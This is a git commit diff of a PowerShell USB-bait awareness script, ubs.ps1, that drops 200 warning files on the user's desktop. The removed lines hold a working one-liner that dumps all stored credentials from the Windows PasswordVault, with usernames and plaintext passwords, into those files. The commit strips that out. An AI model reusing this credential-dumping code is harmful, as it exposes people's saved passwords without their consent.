5895a6351267a2d1a3253a23651afbc4128bba9a
ThomasNordlund1976 <96356419+ThomasNordlund1976@users.noreply.github.com>
2021-12-18 23:42:34 +0100

    test
    test

--- ubs.ps1
+++ ubs.ps1
@@ -1,4 +1,3 @@
 ﻿foreach ($i in 1..200){
-    [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
-    new-item "$env:HOMEDRIVE$env:HOMEPATH\desktop\I_should_not_use_unknown_USBs-$i.txt" -ItemType File -Force -Value "DONT BE A SECURITYRISK!`r`n  $(((New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }) | select resource,username,password)"
+        new-item "$env:HOMEDRIVE$env:HOMEPATH\desktop\I_should_not_use_unknown_USBs-$i.txt" -ItemType File -Force -Value "DONT BE A SECURITYRISK!`r`n"  
 }
